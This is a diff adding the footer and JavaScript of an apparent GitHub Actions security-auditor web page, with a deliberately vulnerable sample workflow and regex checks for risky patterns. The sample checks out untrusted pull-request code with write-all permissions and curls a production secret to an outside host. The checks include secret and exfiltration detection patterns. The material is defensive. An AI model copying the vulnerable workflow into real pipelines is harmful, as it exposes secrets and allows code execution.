+    </details>
+  </section>
+</main>
+
+<footer class="tavardt-footer">
+  <div class="tavardt-footer-inner">
+    <div class="tavardt-footer-col">
+      <div class="tavardt-footer-logo">TAVARDT<span class="tavardt-brand-dot">.</span></div>
+      <p class="tavardt-footer-mission">We turn invisible digital operations into recognized and defensible digital architectures.</p>
+      <div class="tavardt-footer-jurisdiction-tag">United States &bull; Cybersecurity &amp; Digital Engineering</div>
+    </div>
+    <div class="tavardt-footer-col">
+      <div class="tavardt-footer-heading">Regional Navigation</div>
+      <ul class="tavardt-footer-links">
+        <li><a href="https://ag.tavardt.com/us/" target="_blank" rel="noopener">Portal</a></li>
+        <li><a href="https://tools.tavardt.com/us/" target="_blank" rel="noopener">Tools Center</a></li>
+        <li><a href="https://ag.tavardt.com/us/contato/" target="_blank" rel="noopener">Contact</a></li>
+      </ul>
+    </div>
+    <div class="tavardt-footer-col">
+      <div class="tavardt-footer-heading">Governance &amp; Compliance</div>
+      <p class="tavardt-footer-compliance-text">Defensive architecture and security controls adhering to OWASP Top 10 CI/CD Security, SLSA Framework, and Cloudflare Zero Trust guidelines.</p>
+    </div>
+  </div>
+  <div class="tavardt-footer-bottom">
+    <p>&copy; 2026 TAVARDT &mdash; United States. All rights reserved.</p>
+  </div>
+</footer>
+
+<script>
+const SAMPLES = {
+  vulnerable: `name: CI Deploy & Release
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+
+permissions: write-all
+
+jobs:
+  test_and_deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout PR Code
+        uses: actions/checkout@v3
+        with:
+          ref: \${{ github.event.pull_request.head.sha }}
+
+      - name: Print PR Title
+        run: |
+          echo "Auditing PR: \${{ github.event.pull_request.title }}"
+          curl -X POST https://analytics.internal-corp.net/track -d "secret=\${{ secrets.PROD_API_KEY }}"
+
+      - name: Setup Node
+        uses: actions/setup-node@v3
+        with:
+          node-version: 18`,
+  hardened: `name: CI Hardened Build
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2
+
+      - name: Setup Node
+        uses: actions/setup-node@64ed1c7eab4cce3362f8c340ee73e0a05d4b830c # v3.6.0
+        with:
+          node-version: 18
+
+      - name: Safe Log
+        env:
+          PR_TITLE: \${{ github.event.pull_request.title }}
+        run: |
+          echo "Auditing PR securely with environment variable: $PR_TITLE"`,
+  clear: ''
+};
+
+function loadSample(key) {
+  document.getElementById('yamlInput').value = SAMPLES[key] || '';
+}
+
+const STEPS = ["Mapping event triggers and execution context (on:)...", "Auditing GITHUB_TOKEN permission scopes (permissions:)...", "Verifying integrity and action pinning (uses: @sha)...", "Scanning for shell command injection patterns (run: ${{...}})...", "Examining secret references and exfiltration vectors...", "Computing OWASP Top 10 CI/CD compliance score..."];
+
+function startAudit() {
+  const yaml = document.getElementById('yamlInput').value.trim();
+  if (!yaml) {
+    alert('Please paste your workflow YAML manifest or select a sample template.');
+    return;
+  }
+
+  const btn = document.getElementById('btnAudit');
+  const progressWrap = document.getElementById('progressWrap');
+  const progressFill = document.getElementById('progressFill');
+  const progressStatus = document.getElementById('progressStatus');
+  const resultsContainer = document.getElementById('results-container');
+
+  btn.disabled = true;
+  btn.textContent = "Auditing Workflow...";
+  progressWrap.style.display = 'block';
+  resultsContainer.style.display = 'none';
+
+  let currentStep = 0;
+  const interval = setInterval(() => {
+    if (currentStep < STEPS.length) {
+      progressStatus.textContent = STEPS[currentStep];
+      progressFill.style.width = ((currentStep + 1) / STEPS.length * 100) + '%';
+      currentStep++;
+    } else {
+      clearInterval(interval);
+      runStaticAnalysis(yaml);
+    }
+  }, 450);
+}
+
+function runStaticAnalysis(yaml) {
+  const findings = [];
+  let score = 0;
+
+  // 1. pull_request_target check
+  if (yaml.includes('pull_request_target')) {
+    if (yaml.includes('github.event.pull_request.head.sha') || yaml.includes('head.ref')) {
+      findings.push({
+        severity: 'CRITICAL',
+        title: 'pull_request_target with Insecure Checkout',
+        desc: 'The workflow runs with elevated base permissions and access to secrets while checking out untrusted fork code. Allows immediate RCE and secret extraction.',
+        evidence: 'pull_request_target associated with ref: ${{ github.event.pull_request.head.sha }}'
+      });
+      score += 45;
+    } else {
+      findings.push({
+        severity: 'HIGH',
+        title: 'pull_request_target Used Without Strict Sandboxing',
+        desc: 'The pull_request_target event grants write permissions and access to repository secrets. Must be strictly guarded.',
+        evidence: 'Trigger on: pull_request_target identified in manifest.'
+      });
+      score += 25;
+    }
+  }
+
+  // 2. permissions: write-all check
+  if (yaml.includes('write-all')) {
+    findings.push({
+      severity: 'HIGH',
+      title: 'Excessive GITHUB_TOKEN Permissions (write-all)',
+      desc: 'The default token inherited broad write permissions across all repository scopes, violating the principle of least privilege.',
+      evidence: 'permissions: write-all detected.'
+    });
+    score += 30;
+  } else if (!yaml.includes('permissions:')) {
+    findings.push({
+      severity: 'MEDIUM',
+      title: 'Missing Explicit Permissions Block',
+      desc: 'The workflow omits explicit permissions declarations, inheriting potentially permissive organization defaults.',
+      evidence: 'No root "permissions:" block detected.'
+    });
+    score += 15;
+  }
+
+  // 3. Command Injection strictly inside run: blocks
+  const lines = yaml.split('\n');
+  let inRun = false;
+  let runIndent = 0;
+  const injectionPattern = /\${{\s*github\.(event\.(pull_request|issue|comment)\.(title|body)|head_ref)/i;
+  const detectedInjections = [];
+
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i];
+    const stripped = line.trim();
+    const indent = line.search(/\S/);
+
+    if (stripped.startsWith('run:')) {
+      inRun = true;
+      runIndent = indent >= 0 ? indent : 0;
+      if (injectionPattern.test(line)) {
+        detectedInjections.push(stripped);
+      }
+      continue;
+    }
+
+    if (inRun) {
+      if (stripped && indent <= runIndent && /^[a-zA-Z0-9_-]+:/.test(stripped)) {
+        inRun = false;
+      } else if (inRun && injectionPattern.test(line)) {
+        detectedInjections.push(stripped);
+      }
+    }
+  }
+
+  if (detectedInjections.length > 0) {
+    findings.push({
+      severity: 'CRITICAL',
+      title: 'Shell Command Injection in Inline Run Blocks',
+      desc: 'Untrusted user input expressions are interpolated directly inside shell commands, enabling shell breakout and remote execution.',
+      evidence: 'Direct interpolation in run: ' + detectedInjections.slice(0, 2).join('; ')
+    });
+    score += 40;
+  }
+
+  // 4. Unpinned Actions check
+  const tagActionPattern = /uses:\s*([a-zA-Z0-9_.-]+\/[a-zA-Z0-9_.-]+)@(v[0-9]+|main|master)/g;
+  const unpinnedMatches = [];
+  let m;
+  while ((m = tagActionPattern.exec(yaml)) !== null) {
+    unpinnedMatches.push(m[1] + '@' + m[2]);
+  }
+  if (unpinnedMatches.length > 0) {
+    findings.push({
+      severity: 'MEDIUM',
+      title: 'Third-Party Actions Pinned to Mutable Tags',
+      desc: 'External actions rely on mutable tags rather than immutable commit SHAs, exposing the pipeline to supply chain hijacking.',
+      evidence: 'Unpinned actions: ' + unpinnedMatches.slice(0, 3).join(', ') + (unpinnedMatches.length > 3 ? '...' : '')
+    });
+    score += 15;
+  }
+
+  // 5. Secret leak patterns
+  const secretKeyPatterns = [
+    { name: 'AWS Access Key ID', regex: /AKIA[0-9A-Z]{16}/ },
+    { name: 'GitHub Personal Access Token', regex: /ghp_[0-9a-zA-Z]{36}/ },
+    { name: 'SSH/RSA Private Key', regex: /-----BEGIN (RSA |OPENSSH |EC )?PRIVATE KEY-----/ },
+    { name: 'Secret Exfiltration via Curl/Webhook', regex: /curl.*-d.*secrets\./i }
+  ];
+  secretKeyPatterns.forEach(p => {
+    if (p.regex.test(yaml)) {
+      findings.push({
+        severity: 'CRITICAL',
+        title: 'Sensitive Credential or Secret Exfiltration Detected: ' + p.name,
+        desc: 'Detected hardcoded credentials or transmission of secrets to external unverified endpoints.',
+        evidence: 'Sensitive pattern match in manifest content.'
+      });
+      score += 45;
+    }
+  });
+
+  if (findings.length === 0) {
+    findings.push({
+      severity: 'CLEAN',
+      title: 'No Critical Vulnerabilities Detected',
+      desc: 'The YAML workflow complies with Zero Trust guidelines: restricted permissions, secure checkout, no unpinned actions, and variables isolated in env blocks.',
+      evidence: 'Static verification finished with zero OWASP Top 10 CI/CD violations.'
+    });
+    score = 0;
+  }
+
+  score = Math.min(100, score);
+  renderResults(score, findings);
+}
+
+function renderResults(score, findings) {
+  const progressWrap = document.getElementById('progressWrap');
+  const resultsContainer = document.getElementById('results-container');
+  const btn = document.getElementById('btnAudit');
+  const scoreNum = document.getElementById('scoreNum');
+  const gaugeFg = document.getElementById('gaugeFg');
+  const scoreVerdict = document.getElementById('scoreVerdict');
+  const findingsGrid = document.getElementById('findingsGrid');
+  const waBtn = document.getElementById('waBtn');
+
+  progressWrap.style.display = 'none';
+  resultsContainer.style.display = 'block';
+  btn.disabled = false;
+  btn.textContent = "Audit Workflow Security";
+
+  scoreNum.textContent = score;
+  const offset = 414.69 - (score / 100 * 414.69);
+  gaugeFg.style.strokeDashoffset = offset;
+
+  if (score >= 60) {
+    gaugeFg.style.stroke = 'var(--red)';
+    scoreVerdict.textContent = "Critical Alert: High Risk of Secret Leakage or RCE!";
+    scoreVerdict.style.color = 'var(--red)';
+  } else if (score >= 25) {
+    gaugeFg.style.stroke = 'var(--yellow)';
+    scoreVerdict.textContent = "Warning: Supply Chain Weaknesses & Misconfigurations Detected";
+    scoreVerdict.style.color = 'var(--yellow)';
+  } else {
+    gaugeFg.style.stroke = 'var(--green)';
+    scoreVerdict.textContent = "Pipeline Compliant with Zero Trust Best Practices";
+    scoreVerdict.style.color = 'var(--green)';
+  }
+
+  findingsGrid.innerHTML = findings.map(f => `
+    <div class="finding-card ${f.severity}">
+      <span class="finding-badge">${f.severity}</span>
+      <div class="finding-body">
+        <div class="finding-title">${f.title}</div>
+        <div class="finding-desc">${f.desc}</div>
+        <div class="finding-evidence">${f.evidence}</div>
+      </div>
+    </div>
+  `).join('');
+
+  const customWaText = encodeURIComponent(`Hello Sofia, I ran the TAVARDT CI/CD Security Auditor for United States and my workflow scored ${score}/100. I would like to request technical guidance for pipeline hardening and secret protection.`);
+  waBtn.href = `https://wa.me/5584987721775?text=${customWaText}`;
+}
+</script>
+
+</body>
+</html>
